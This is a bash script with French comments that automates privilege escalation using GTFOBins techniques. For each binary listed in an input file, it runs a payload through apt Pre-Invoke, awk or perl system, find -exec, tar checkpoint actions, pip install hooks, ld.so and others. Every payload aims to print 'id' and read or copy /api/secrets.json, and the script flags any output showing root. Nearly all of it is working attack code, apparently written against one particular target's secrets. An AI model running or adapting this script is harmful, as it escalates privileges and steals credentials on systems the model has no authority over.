#!/bin/bash

# Fichier contenant les binaires et leurs URL sur GTFOBins
input_file="/dev/shm/gtfobins_results.txt"
output_file="/dev/shm/privesc_results.txt"

# Vider le fichier de sortie
> "$output_file"

echo "🔍 Démarrage des tests d'élévation de privilèges..." | tee -a "$output_file"
echo "📋 Résultats enregistrés dans $output_file" | tee -a "$output_file"
echo "--------------------------------------------------" | tee -a "$output_file"

# Fonction pour tester l'élévation de privilèges
test_privesc() {
    local binary=$1
    local cmd=$2
    local description=$3

    echo "🧪 Test de $binary: $description" | tee -a "$output_file"
    echo "📜 Commande: $cmd" | tee -a "$output_file"
    
    # Créer un fichier temporaire pour stocker la sortie
    tmp_output=$(mktemp /dev/shm/privesc_test.XXXXXX)
    
    # Exécuter la commande avec timeout pour éviter les blocages
    timeout 3s bash -c "$cmd" > "$tmp_output" 2>&1
    exit_code=$?
    
    # Vérifier si la commande a fonctionné
    if [ $exit_code -eq 0 ]; then
        echo "✅ Test réussi pour $binary!" | tee -a "$output_file"
        
        # Vérifier si nous avons obtenu des privilèges root
        if grep -q "uid=0" "$tmp_output" || grep -q "root" "$tmp_output"; then
            echo "🚨 ÉLÉVATION DE PRIVILÈGES DÉTECTÉE AVEC $binary! 🚨" | tee -a "$output_file"
        fi
    else
        echo "❌ Test échoué pour $binary (code: $exit_code)" | tee -a "$output_file"
    fi
    
    # Afficher la sortie de la commande
    echo "📄 Sortie:" | tee -a "$output_file"
    cat "$tmp_output" | tee -a "$output_file"
    echo "" | tee -a "$output_file"
    
    # Supprimer le fichier temporaire
    rm "$tmp_output"
    
    echo "--------------------------------------------------" | tee -a "$output_file"
}

# Lire chaque ligne du fichier
while IFS= read -r line; do
    # Extraire le nom du binaire
    binary=$(echo "$line" | awk '{print $1}')
    
    # Tester les exploitations spécifiques pour chaque binaire
    case $binary in
        apt)
            test_privesc "$binary" "apt update -o APT::Update::Pre-Invoke='id; cat /api/secrets.json'" "Exécution de commande via Pre-Invoke"
            ;;
        apt-get)
            test_privesc "$binary" "apt-get update -o APT::Update::Pre-Invoke='id; cat /api/secrets.json'" "Exécution de commande via Pre-Invoke"
            ;;
        awk)
            test_privesc "$binary" "awk 'BEGIN {system(\"id; cat /api/secrets.json\")}'" "Exécution de commande via system"
            ;;
        bash)
            test_privesc "$binary" "bash -c 'id; cat /api/secrets.json'" "Exécution directe de commande"
            ;;
        cpan)
            test_privesc "$binary" "echo 'system(\"id; cat /api/secrets.json\")' | cpan" "Exécution de commande via CPAN"
            ;;
        curl)
            test_privesc "$binary" "LFILE=/api/secrets.json; curl file://$LFILE" "Lecture de fichier"
            ;;
        dd)
            test_privesc "$binary" "LFILE=/api/secrets.json; dd if=$LFILE" "Lecture de fichier"
            ;;
        find)
            test_privesc "$binary" "find . -exec sh -c 'id; cat /api/secrets.json' \\;" "Exécution de commande via -exec"
            ;;
        flock)
            test_privesc "$binary" "flock -u / /bin/sh -c 'id; cat /api/secrets.json'" "Exécution de commande"
            ;;
        gzip)
            test_privesc "$binary" "LFILE=/api/secrets.json; gzip -f $LFILE -t" "Lecture de fichier via test"
            ;;
        install)
            test_privesc "$binary" "LFILE=/api/secrets.json; install -m 644 $LFILE /dev/shm/secrets_leaked.json" "Copie de fichier"
            ;;
        ld.so)
            test_privesc "$binary" "/lib64/ld.so /bin/sh -c 'id; cat /api/secrets.json'" "Exécution de commande"
            ;;
        mail)
            test_privesc "$binary" "LFILE=/api/secrets.json; mail --exec='!/bin/sh -c \"id; cat $LFILE\"'" "Exécution de commande via --exec"
            ;;
        make)
            test_privesc "$binary" "make -s --eval=\"\$(echo 'x:\n\t@id; cat /api/secrets.json')\"" "Exécution de commande via eval"
            ;;
        more)
            test_privesc "$binary" "LFILE=/api/secrets.json; more $LFILE" "Lecture de fichier"
            ;;
        mount)
            test_privesc "$binary" "mount -o bind /api /dev/shm" "Montage de répertoire"
            ;;
        perl)
            test_privesc "$binary" "perl -e 'system(\"id; cat /api/secrets.json\")'" "Exécution de commande via system"
            ;;
        pip)
            test_privesc "$binary" "TF=\$(mktemp -d); echo 'import os; os.system(\"id; cat /api/secrets.json\")' > \$TF/setup.py; pip install \$TF" "Exécution de commande via installation"
            ;;
        python3)
            test_privesc "$binary" "python3 -c 'import os; os.system(\"id; cat /api/secrets.json\")'" "Exécution de commande via system"
            ;;
        sed)
            test_privesc "$binary" "LFILE=/api/secrets.json; sed -n 'p' \"\$LFILE\"" "Lecture de fichier"
            ;;
        tar)
            test_privesc "$binary" "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c \"id; cat /api/secrets.json\"'" "Exécution de commande via checkpoint"
            ;;
        tee)
            test_privesc "$binary" "LFILE=/api/secrets.json; tee < \"\$LFILE\"" "Lecture de fichier"
            ;;
        xargs)
            test_privesc "$binary" "echo | xargs -I% sh -c 'id; cat /api/secrets.json'" "Exécution de commande"
            ;;
        *)
            # Pour les binaires non traités spécifiquement, tenter une exécution simple
            if command -v "$binary" >/dev/null 2>&1; then
                test_privesc "$binary" "$binary --help | grep -i 'exec\\|privilege\\|command'" "Recherche d'options d'exécution dans l'aide"
            fi
            ;;
    esac

done < "$input_file"

echo "🏁 Tests d'élévation de privilèges terminés!" | tee -a "$output_file"
echo "📋 Résultats complets disponibles dans $output_file" | tee -a "$output_file"

# Rechercher les succès potentiels
echo "🔍 Vérification des résultats..." | tee -a "$output_file"
grep -A 5 "ÉLÉVATION DE PRIVILÈGES DÉTECTÉE" "$output_file" | tee -a "/dev/shm/privesc_success.txt"
echo "Les résultats prometteurs sont enregistrés dans /dev/shm/privesc_success.txt" | tee -a "$output_file"
